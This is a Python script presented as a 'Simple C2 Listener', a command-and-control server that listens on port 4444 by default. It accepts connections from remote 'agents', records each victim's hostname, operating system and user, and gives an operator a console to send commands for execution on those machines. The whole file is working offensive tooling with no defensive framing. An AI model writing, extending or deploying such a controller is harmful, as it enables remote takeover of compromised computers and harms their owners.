#!/usr/bin/env python3
"""
Simple C2 Listener - Receives agents and sends commands
"""

import socket
import json
import threading
import sys
from pathlib import Path

# Store connected agents
agents = {}

def log(msg):
    """Log with timestamp"""
    from datetime import datetime
    ts = datetime.now().strftime('%H:%M:%S')
    print(f"[{ts}] {msg}")

def handle_agent(client_socket, addr):
    """Handle individual agent connection"""
    agent_id = f"{addr[0]}:{addr[1]}"
    log(f"✓ New agent connected: {agent_id}")
    agents[agent_id] = {
        'socket': client_socket,
        'addr': addr,
        'info': None
    }
    
    try:
        while True:
            # Receive data from agent
            data = client_socket.recv(4096).decode()
            if not data:
                log(f"✗ Agent {agent_id} disconnected")
                break
            
            try:
                msg = json.loads(data)
                log(f"[{agent_id}] Received: {msg.get('type', 'unknown')} - {str(msg)[:80]}")
                
                # Store system info
                if msg.get('type') == 'info':
                    agents[agent_id]['info'] = msg
                    log(f"  └─ {msg.get('hostname')} ({msg.get('platform')})")
                
            except json.JSONDecodeError:
                log(f"[{agent_id}] Invalid JSON: {data[:100]}")
    
    except Exception as e:
        log(f"✗ Error with {agent_id}: {e}")
    finally:
        try:
            client_socket.close()
        except:
            pass
        del agents[agent_id]

def listener_thread(host, port):
    """Main listener thread"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    log(f"🚀 Listener started on {host}:{port}")
    
    try:
        while True:
            client, addr = server.accept()
            thread = threading.Thread(target=handle_agent, args=(client, addr), daemon=True)
            thread.start()
    except KeyboardInterrupt:
        log("Shutting down...")
    finally:
        server.close()

def send_command(agent_id, cmd_type, **kwargs):
    """Send command to specific agent"""
    if agent_id not in agents:
        log(f"✗ Agent not found: {agent_id}")
        return False
    
    cmd = {'cmd': cmd_type}
    cmd.update(kwargs)
    
    try:
        agents[agent_id]['socket'].send(json.dumps(cmd).encode())
        log(f"→ Sent to {agent_id}: {cmd_type}")
        return True
    except Exception as e:
        log(f"✗ Failed to send: {e}")
        return False

def interactive_shell():
    """Interactive command shell"""
    while True:
        try:
            cmd = input("\n[LISTENER] > ").strip()
            
            if not cmd:
                continue
            
            if cmd == 'help':
                print("""
Commands:
  list              - List all connected agents
  shell <id>        - Interactive shell with agent <id>
  exec <id> <cmd>   - Execute command on agent
  exit              - Exit listener
                """)
                continue
            
            if cmd == 'list':
                if not agents:
                    print("No agents connected")
                else:
                    for aid, info in agents.items():
                        agent_info = info.get('info', {})
                        print(f"  {aid}")
                        if agent_info:
                            print(f"    ├─ Host: {agent_info.get('hostname')}")
                            print(f"    ├─ OS: {agent_info.get('platform')}")
                            print(f"    └─ User: {agent_info.get('user')}")
                continue
            
            if cmd.startswith('exec '):
                parts = cmd.split(' ', 2)
                if len(parts) < 3:
                    print("Usage: exec <agent_id> <command>")
                    continue
                agent_id, command = parts[1], parts[2]
                send_command(agent_id, 'exec', data=command)
                continue
            
            if cmd == 'exit' or cmd == 'quit':
                break
            
            print("Unknown command. Type 'help' for help.")
        
        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    
    # Start listener in background
    listener = threading.Thread(target=listener_thread, args=(host, port), daemon=False)
    listener.start()
    
    # Interactive shell
    try:
        interactive_shell()
    except KeyboardInterrupt:
        log("Listener stopped")
